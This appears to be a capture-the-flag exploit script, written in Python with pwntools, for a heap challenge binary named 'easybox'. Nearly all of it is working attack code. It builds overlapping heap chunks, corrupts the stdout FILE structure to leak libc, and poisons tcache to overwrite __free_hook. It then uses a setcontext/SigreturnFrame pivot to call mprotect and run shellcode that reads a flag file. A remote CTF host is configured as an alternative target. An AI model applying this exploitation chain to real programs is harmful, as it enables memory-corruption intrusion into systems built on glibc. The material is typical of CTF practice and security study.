# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './easybox'
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)

else:
    host = '121.40.89.206'
    port = '41232'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def cmd(num):
    sla('ch:',num)

def add(idx ,size , text = "a" ):
    cmd(1)
    sla('index?' , idx)
    sla('size??' , size)
    sla('something' , text)

def delete(idx):
    cmd(2)
    sla('index?' , idx)

def edit(idx , text):
    cmd(3)
    sla('index?' , idx)
    sla('something' , text)

# one_gad = one_gadget(libc.path)

def attack():
    
    # $rebase(0x000000000004060)

    add(0 , 0x18)

    add(1 , 0x248)
    add(2 , 0x248)
    add(3 , 0x248)
    add(4 , 0x248)

    add(16 , 0x18)

    edit(0 , flat(0 , 0 , 0 , 0x250*4+1))
    delete(1)
    delete(3)
    delete(2)

    add(5 , 0x128)
    add(6 , 0x118)

    add(7 , 0x128 , p16(0x36a0))
    add(8 , 0x118)

    add(9 , 0x248)
    fake_io = flat(
        0xfbad1800 ,0,
        0,0,
    )
    add(10 ,0x248 , fake_io + '\x00')

    _IO_2_1_stdin_ = l64()
    libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']
    __free_hook = libc.sym['__free_hook']
    lg('__free_hook',__free_hook)

    add(11 , 0x248)
    add(12 , 0x248)

    delete(11)
    delete(12)

    edit(4 , p64(__free_hook - 0x18))

    magic = libc.address + 0x00154930
    setcontext = libc.sym['setcontext'] + 61

    # getkeyserv_handle+576
    # <getkeyserv_handle+576>:	mov    rdx,QWORD PTR [rdi+0x8]
    # <getkeyserv_handle+580>:	mov    QWORD PTR [rsp],rax
    # <getkeyserv_handle+584>:	call   QWORD PTR [rdx+0x20]

    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = (libc.sym['__free_hook'] + 8)&0xfffffffff000
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rip = libc.sym['mprotect']
    frame.rsp = __free_hook - 0x18 + 0x150

    orw_payload = shellcraft.open('flag')
    orw_payload +=shellcraft.read(3,libc.sym['__free_hook']+0x10,0x50)
    orw_payload +=shellcraft.write(1,libc.sym['__free_hook']+0x10,0x50)

    payload = flat(
        0 , __free_hook - 0x18,
        0 , magic , 
        setcontext , str(frame)[0x28:],
    )
    payload  = payload.ljust(0x150,'\x00') + p64(__free_hook - 0x18 + 0x158)
    payload += asm( orw_payload ) 
    add(13 , 0x248)
    add(14 , 0x248 , payload)

    #此方法需要有 mprotect 系统调用

    # dbg('free')

    delete(14)

    p.interactive()

attack()

# boom(attack)

'''
@File    :   easybox.py
@Time    :   2022/01/17 19:22:01
@Author  :   Niyah 
'''